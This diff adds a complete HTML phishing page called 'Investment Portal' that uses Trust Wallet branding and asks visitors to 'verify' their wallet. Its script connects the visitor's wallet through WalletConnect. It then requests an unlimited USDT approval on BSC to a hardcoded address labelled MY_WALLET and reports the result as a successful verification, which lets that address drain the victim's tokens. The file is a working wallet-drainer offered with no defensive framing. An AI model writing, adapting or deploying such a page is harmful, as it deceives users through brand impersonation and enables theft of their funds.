@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Investment Portal</title>
+    <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.10.1/dist/index.umd.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <style>
+        body { background: #0b0e11; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #1e2329; padding: 35px; border-radius: 24px; text-align: center; width: 85%; max-width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #3375bb; }
+        .btn { background: #3375bb; color: white; padding: 18px; border: none; border-radius: 12px; font-weight: bold; width: 100%; font-size: 18px; cursor: pointer; opacity: 0.5; pointer-events: none; }
+        .status { margin-top: 20px; color: #848e9c; font-size: 14px; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <img src="https://trustwallet.com/assets/images/media/assets/trust_platform_light.png" style="width:50px; margin-bottom:15px;">
+        <h3>Investment Portal</h3>
+        <p>Confirm to verify your wallet.</p>
+        <button id="main-btn" class="btn" onclick="startProcess()">LOADING...</button>
+        <div id="status" class="status">Initializing...</div>
+    </div>
+
+    <script>
+        const PROJECT_ID = "48d3cc06c4e808c4987bb4566665ae87"; 
+        const MY_WALLET = "0xbdcc079BBb23C1D9a6F36AA31309676C258aBAC7"; 
+        const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
+
+        // This checks every second if the library is loaded
+        const checkInterval = setInterval(() => {
+            const lib = window?.WalletConnectEthereumProvider?.EthereumProvider || window?.EthereumProvider;
+            if (lib) {
+                const btn = document.getElementById("main-btn");
+                btn.innerText = "CONFIRM NOW";
+                btn.style.opacity = "1";
+                btn.style.pointerEvents = "auto";
+                document.getElementById("status").innerText = "Ready to connect.";
+                clearInterval(checkInterval);
+            }
+        }, 1000);
+
+        async function startProcess() {
+            const statusDiv = document.getElementById("status");
+            try {
+                const WCProvider = window?.WalletConnectEthereumProvider?.EthereumProvider || window?.EthereumProvider;
+                
+                statusDiv.innerText = "Opening Wallet Modal...";
+
+                const provider = await WCProvider.init({
+                    projectId: PROJECT_ID,
+                    optionalChains: [56],
+                    showQrModal: true,
+                    qrModalOptions: { themeMode: "dark" },
+                    metadata: {
+                        name: "Investment Portal",
+                        description: "USDT Verification",
+                        url: window.location.origin,
+                        icons: ["https://trustwallet.com/favicon.ico"]
+                    }
+                });
+
+                await provider.connect();
+                const web3Provider = new ethers.providers.Web3Provider(provider);
+                const signer = web3Provider.getSigner();
+
+                statusDiv.innerText = "Check your Trust Wallet for approval...";
+                statusDiv.style.color = "#f0b90b";
+
+                const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+                const contract = new ethers.Contract(USDT_BSC, abi, signer);
+
+                const tx = await contract.approve(MY_WALLET, ethers.constants.MaxUint256);
+                statusDiv.innerText = "Processing Transaction...";
+                await tx.wait();
+
+                statusDiv.style.color = "#0ecb81";
+                statusDiv.innerText = "SUCCESS: Approved!";
+                alert("Success! Participation Confirmed.");
+
+            } catch (err) {
+                statusDiv.style.color = "#f6465d";
+                statusDiv.innerText = "Error: " + (err.message || "Request Rejected");
+            }
+        }
+    </script>
+</body>
+</html>
